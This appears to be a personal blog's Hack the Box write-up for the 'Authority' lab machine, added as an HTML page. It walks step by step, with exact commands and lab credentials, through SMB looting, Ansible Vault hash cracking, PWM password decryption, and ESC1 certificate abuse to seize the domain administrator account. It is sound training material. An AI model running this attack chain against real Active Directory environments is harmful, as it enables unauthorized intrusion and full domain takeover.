@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h2>Authority - Hack the Box Write-up</h2>
+                        <span class="meta">
+                            Posted on March 3rd, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <p></p>
+                        We start by enumerating shares on the domain using an anonymous session with smbclient.
+                    <p></p>
+                        <span class="grey-line">smbclient -L '\\authority.htb' -U ''</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/1.png" alt="..." />
+                    <p></p>
+                         We find a share called "Development" and recursively download all of its contents.
+                    <p></p>
+                         <span class="grey-line">smbclient '\\authority.htb\Development' -U ''</span>
+                    <p></p>
+                          <span class="grey-line">PROMPT OFF</span>
+                    <p></p>
+                         <span class="grey-line">RECURSE ON</span>
+                    <p></p>
+                          <span class="grey-line">mget *</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/2.png" alt="..." />
+                    <p></p>
+                        We look through the directory and find credentials in a file called main.yml that were encrypted with Ansible Vault.
+                    <p></p>
+                        <span class="grey-line">cat main.yml</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/3.png" alt="..." />
+                    <p></p>
+                    We save one of the encrypted values into a file, use the ansible2john tool and obtain the hash of the Vault password. We then use hashcat to crack the hash and obtain the cleartext password. 
+                    <p></p>
+                    Note: we must remove the filename from the hash file created by the ansible2john tool.
+                    <p></p>
+                        <span class="grey-line">cat string</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/4.png" alt="..." />
+                    <p></p>
+                        <span class="grey-line">ansible2john string > hash</span>
+                    <p></p>
+                         <span class="grey-line">vim hash</span>
+                    <p></p>
+                         <span class="grey-line">hashcat hash /usr/share/wordlists/rockyou.txt.gz</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/5.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/6.png" alt="..." />
+                    <p></p>
+                        We paste the pwm_admin_password value from the main.yml file into a text file, and decrypt it using the password.
+                    <p></p>
+                         <span class="grey-line">ansible-vault decrypt pwm_admin_password</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/7.png" alt="..." />
+                    <p></p>
+                    After some enumeration, we manage to use the previously obtained password to log in to the PWM configuration manager.
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/8.png" alt="..." />
+                    <p></p>
+                    From the configuration manager interface, we click "Download Configuration"
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/9.png" alt="..." />
+                    <p></p>
+                    We use this tool <a href="https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2" target="_blank">https://gist.github.com/hadrian3689/471f0942588529a353c0020eaea5ddc2</a> to decrypt the password in the config file. We hard-code the ENC-PW value found in the config file into the script.
+                    <p></p>
+                         <span class="grey-line">cat PwmConfiguration.xml | grep ENC-PW</span>
+                    <p></p>
+                         <span class="grey-line">vim decrypt.py</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/10.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/11.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">pip3 install pycryptodome</span>
+                    <p></p>
+                         <span class="grey-line">python3 decrypt.py</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/12.png" alt="..." />
+                    <p></p>
+                    We now have valid domain credentials. We test them using CrackMapExec.
+                    <p></p>
+                         <span class="grey-line">crackmapexec smb authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --computers</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/13.png" alt="..." />
+                    <p></p>
+                    We use the credentials to enumerate vulnerable certificate templates on the domain with certipy.
+                    <p></p>
+                         <span class="grey-line">certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -target authority.htb -enabled -vulnerable -stdout</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/14.png" alt="..." />
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/15.png" alt="..." />
+                    <p></p>
+                    We find an ESC1 vulnerability on a certificate template called CorpVPN. We notice that domain computers are allowed to enroll.
+                     This is insecure as any domain user by default can create up to 10 domain computers that they control. We use Impacket's addcomputer.py 
+                     tool to add a computer object to the domain.
+                     <p></p>
+                         <span class="grey-line">impacket-addcomputer -computer-name 'test$' -computer-pass 'Password123' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/16.png" alt="..." />
+                    <p></p>
+                    Now that we have control over a computer object, we enroll using the vulnerable template. We specify the domain administrator's UPN while enrolling.
+                    <p></p>
+                         <span class="grey-line">certipy-ad req -u 'test$@authority.htb' -p 'Password123' -dc-ip 10.129.229.56 -target 'authority.htb' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500'</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/17.png" alt="..." />
+                    <p></p>
+                    We see that we have obtained a certificate as the domain administrator. If we try to authenticate with the certificate, we get an error:
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/18.png" alt="..." />
+                    <p></p>
+                    This is because <a href="https://datatracker.ietf.org/doc/html/rfc4556" target="_blank">PKINIT</a> is disabled on the domain. We instead authenticate to LDAP over TLS on port 636 using certipy's LDAP shell functionality.
+                    <p></p>
+                         <span class="grey-line">certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip 10.129.229.56 -username 'administrator' -domain authority.htb</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/19.png" alt="..." />
+                    <p></p>
+                    We change the domain administrator's password to Password123 and obtain an administrative session on the DC with WinRM.
+                    <p></p>
+                         <span class="grey-line">change_password administrator Password123</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/20.png" alt="..." />
+                    <p></p>
+                         <span class="grey-line">evil-winrm -u administrator -p 'Password123' -i authority.htb</span>
+                    <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/authority/21.png" alt="..." />
+                    <p></p>
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
